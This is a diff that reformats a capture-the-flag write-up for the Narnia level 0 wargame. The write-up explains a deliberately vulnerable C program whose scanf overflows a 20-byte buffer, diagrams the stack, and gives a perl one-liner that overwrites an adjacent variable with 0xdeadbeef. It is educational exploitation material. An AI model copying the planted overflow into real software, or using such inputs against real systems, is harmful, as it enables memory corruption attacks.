@@ -46,12 +46,14 @@ Well that's interesting that it did something weird with %p. Now let's check the
 
   int main(){
   	long val=0x41414141;
-  	char buf[20];   // notice the buffer here is 20, which means there may be a potential for a buffer overflow
+// notice the buffer here is 20, which means there may be a potential for a buffer overflow
+  	char buf[20];   
 
   	printf("Correct val's value from 0x41414141 -> 0xdeadbeef!\n");
   	printf("Here is your chance: ");
-  	scanf("%24s",&buf);   //notice the buffer read in from the command prompt above is a 24 byte string
-  	                      //this means that we have a 4 byte overflow
+  	scanf("%24s",&buf);   
+//notice the buffer read in from the command prompt above is a 24 byte string
+//this means that we have a 4 byte overflow
 
   	printf("buf: %s\n",buf);        //here it prints the 20 bytes from char buf
   	printf("val: 0x%08x\n",val);    //the 4 bytes that overflow fall into val 
@@ -70,6 +72,7 @@ Well that's interesting that it did something weird with %p. Now let's check the
 {% endhighlight %}
   
 From inspecting the code we can see that the stack looks something like this:
+
 <figure class="highlight"><pre><code class="language-text" data-lang="text">
 ||-------------------------||
 ||                         ||
@@ -95,6 +98,7 @@ Well that's great, we've just confirmed that we can affect what goes into long v
 It's confirmed that i can overwrite the buffer. Apaprently, I was correct in how the
 stack looked and inside it would look similar to this (except in hexadecimal 
 representation).
+
 <figure class="highlight"><pre><code class="language-text" data-lang="text">
         ||--------------||
         ||  0x41414141  ||    
@@ -119,7 +123,6 @@ narnia0@melinda:/narnia$</code></pre></figure>
 Well that didn't work, because scanf is accepting string characters. So now we need a way to get the proper "characters"
 in so that it will display 0xdeadbeef. Remember that you also have to craft the input to be little endian (I think of this
 as the input has to be spelled backwards).
--> perl -e 'print "A"x20 . "\xef\xbe\xad\xde"' | ./narnia0
 
 <figure class="highlight"><pre><code class="language-text" data-lang="text">narnia0@melinda:/narnia$ perl -e 'print "A"x20 . "\xef\xbe\xad\xde"' | ./narnia0
 Correct val's value from 0x41414141 -> 0xdeadbeef!
